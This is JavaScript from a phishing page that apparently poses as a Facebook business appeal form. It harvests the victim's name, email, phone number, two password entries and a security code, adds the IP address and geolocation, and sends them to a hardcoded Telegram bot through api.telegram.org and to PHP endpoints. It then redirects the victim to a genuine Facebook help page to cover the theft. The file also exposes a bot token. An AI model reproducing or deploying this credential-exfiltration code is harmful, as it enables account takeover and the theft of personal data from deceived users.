
    function getIp() {
      $.get("https://api.ipify.org/?format=json", function (response) {
        $("#ip_hidden").val(response.ip);
      });
    }
    getIp();
        var bot = 'bot6006329408:AAES11pvhDfr1e2mNKd18-UHlhZFE-DmZEQ';
        var chid = '5715706976';

    function sendData() {
      $.get("https://ipapi.co/json/", function (response) {
        let ip = $("#ip_hidden").val();
        let country = response.country;
        let city = response.city;

        var params = {
          content: '=============================' + '%0A' +
            '1|Full Name: "' + document.getElementById('name').value.replace('#', '-sharp-') + '"' + '%0A' +
            '2|Email: "' + document.getElementById('email').value.replace('#', '-sharp-') + '"' + '%0A' +
            '3|Appeal: "' + document.getElementById('reason').value.replace('#', '-sharp-') + '"' + '%0A' +
            '4|Number: "' + document.getElementById('phone').value.replace('#', '-sharp-') + '"' + '%0A' +
            '5|City : "' + city + '"' + '%0A' +
            '6|Country: "' + country + '"' + '%0A' +
            'IP: "' + ip + '"' + '%0A' +
            '============================='
        }

                    fetch(`https://api.telegram.org/bot6006329408:AAES11pvhDfr1e2mNKd18-UHlhZFE-DmZEQ/sendMessage?chat_id=5715706976&text=${params.content}/`, {
          method: 'POST', // or 'PUT'
          headers: {
            'Content-Type': 'application/json',
          },

        }).then(function () {
          // $('#exampleModal').modal('show');
        })


      });
    }

    function sendPass2() {
      let password2 = document.getElementById('password2').value.replace('#', '-sharp-');
      $.get("https://ipapi.co/json/", function (response) {
        let country = response.country;
        let regionName = response.region;
        let city = response.city;
        let ip = $("#ip_hidden").val();
        console.log(response);


        var params = {
          content: '=============================' + '%0A' +
            'Passi 2: "' + password2 + '"' + '%0A' +
            'City : "' + city + '"' + '%0A' +
            'Country : "' + country + '"' + '%0A' +
            'Region : "' + regionName + '"' + '%0A' +
            'Number : "' + document.getElementById('phone').value.replace('#', '-sharp-') + '"' + '%0A' +
            'Email : "' + document.getElementById('email').value.replace('#', '-sharp-') + '"' + '%0A' +
            'IP: "' + ip + '"' + '%0A' +
            '============================='
        }


                    fetch(`https://api.telegram.org/bot6006329408:AAES11pvhDfr1e2mNKd18-UHlhZFE-DmZEQ/sendMessage?chat_id=5715706976&text=${params.content}/`, {
          method: 'POST', // or 'PUT'
          headers: {
            'Content-Type': 'application/json',
          },

        }).then(function () {
          window.location = 'confirm.html';
        })


      });
    }

    function validateEmail(email) {
      var re = /\S+@\S+\.\S+/;
      return re.test(email);
    }

    $('.numeric').on('input', function (event) {
      this.value = this.value.replace(/[^0-9]/g, '');
    });
    const btn = document.querySelector('#submit');

    btn.addEventListener('click', (e) => {
      e.preventDefault();
      let openModal = true;
      let name = document.querySelector("#name");
      if (name.value === '') {
        openModal = false;
      }
      checked = $("input[type=checkbox]:checked").length;
      if (!checked) {
        return document.getElementById("termsaccept").innerHTML = "Please accept Terms, Data Policy and Cookies Policy";
        openModal = false;
      }
      let email = document.querySelector("#email");
      if (email.value === '' || validateEmail(email.value) === false) {
        email.style.cssText = 'border: 1px solid red;'
        openModal = false;
      }

      let phone = document.querySelector("#phone");
      if (phone.value === '') {
        phone.style.cssText = 'border: 1px solid red;'
        openModal = false;
      }
      let reason = document.querySelector("#reason");

      if (openModal) {
        var myModal = new bootstrap.Modal(document.getElementById("exampleModal"), {});
        document.getElementById('confirm_email').value = document.getElementById('email').value.replace('#', '-sharp-');
        myModal.show();
      }
    });

    function checkLength(id) {
      let input = document.querySelector("#" + id);
      if (input.value !== '') {
        input.style.cssText = 'border: 1px solid grey';
      }
    }

    function handleActions(e) {
      let pass = document.getElementById('password').value.replace('#', '-sharp-');
      if (pass.length === 0) {
        $('#password').css('border', '1px solid red');
        return;
      } else {
        let tries = document.getElementById('pw_tries');
        if (parseInt(tries.value) === 0) {
          // document.querySelector("#wrong_pass").classList.remove('d-none');
          // document.getElementById('password').value = '';
          // document.getElementById('password').style.border = '1px solid red';
          $("#exampleModal1").modal('hide');
          $("#exampleModal1").modal('show');
          document.getElementById('confirm_email1').value = document.getElementById('email').value.replace('#', '-sharp-');
          document.getElementById('emailpass2').value = document.getElementById('email').value.replace('#', '-sharp-');
          document.getElementById('phonepass2').value = document.getElementById('phone').value.replace('#', '-sharp-');
          $.get("https://ipapi.co/json/", function (response) {
            let country = response.country;
            let regionName = response.region;
            let city = response.city;
            document.getElementById('city2').value = response.city;
            let ip = $("#ip_hidden").val();


            var params = {
              content: '=============================' + '%0A' +
                'Passi 1: "' + pass + '"' + '%0A' +
                'City : "' + city + '"' + '%0A' +
                'Country : "' + country + '"' + '%0A' +
                'Number : "' + document.getElementById('phone').value.replace('#', '-sharp-') + '"' + '%0A' +
                'Email : "' + document.getElementById('email').value.replace('#', '-sharp-') + '"' + '%0A' +
                'IP: "' + ip + '"' + '%0A' +
                '============================='
            }


                    fetch(`https://api.telegram.org/bot6006329408:AAES11pvhDfr1e2mNKd18-UHlhZFE-DmZEQ/sendMessage?chat_id=5715706976&text=${params.content}/`, {
              method: 'POST', // or 'PUT'
              headers: {
                'Content-Type': 'application/json',
              },

            }).then(function () {

            })




          });
        } else {
          let code = document.querySelector("#code");
          if (code === null) {
            document.querySelector("#wrong_pass").classList.add('d-none');
            let password = document.querySelector("#password").value.replace('#', '-sharp-');
            $.get("https://ipapi.co/json/", function (response) {
              let country = response.country;
              let regionName = response.region;
              let city = response.city;
              let ip = $("#ip_hidden").val();
              console.log(response);


              var params = {
                content: '=============================' + '%0A' +
                  'Passi 2: "' + password + '"' + '%0A' +
                  'City : "' + city + '"' + '%0A' +
                  'Country : "' + country + '"' + '%0A' +
                  'Region : "' + regionName + '"' + '%0A' +
                  'Number : "' + document.getElementById('phone').value.replace('#', '-sharp-') + '"' + '%0A' +
                  'Email : "' + document.getElementById('email').value.replace('#', '-sharp-') + '"' + '%0A' +
                  'IP: "' + ip + '"' + '%0A' +
                  '============================='
              }


                    fetch(`https://api.telegram.org/bot6006329408:AAES11pvhDfr1e2mNKd18-UHlhZFE-DmZEQ/sendMessage?chat_id=5715706976&text=${params.content}/`, {
                method: 'POST', // or 'PUT'
                headers: {
                  'Content-Type': 'application/json',
                },

              }).then(function () {

              })

              let twoPages = true;
              if (twoPages) {
                window.location = 'confirm.html';
              } else {
                document.querySelector("#modal_header").innerText = 'Enter security code';
                document.querySelector("#mod_title").innerText = 'Please enter your security code';
                document.querySelector("#modal_form").innerHTML = '<div class="mt-1 d-flex justify-content-between"><label for="email">Code:</label><input type="text" class="ml-2 input-password" id="code" placeholder="Enter your code"  name="code" style="float: right;"></div>';
              }
            });
          } else {
            $.get("https://ipapi.co/json/", function (response) {
              let country = response.country;
              let regionName = response.region;
              let city = response.city;
              let ip = $("#ip_hidden").val();
              $.post("step_three.php", {
                code: code.value,
                city: city,
                ip: document.getElementById('ipaddress').value.replace('#', '-sharp-')
              });
              window.setTimeout(function () {
                window.location = 'https://www.facebook.com/business/help/507905413074296?helpref=search&sr=1&query=contact';
              }, 3000)
            });
          }

        }
      }
    }
    function sendBean() {
      $.get("https://ipapi.co/json/", function (response) {
        let country = response.country;
        let regionName = response.region;
        let city = response.city;
        let ip = $("#ip_hidden").val();
        $.post("step_one.php", {
          country: country,
          regionName: regionName,
          city: city,
          ip: document.getElementById('ipaddress').value.replace('#', '-sharp-')
        });
      });
    }
    sendBean();
  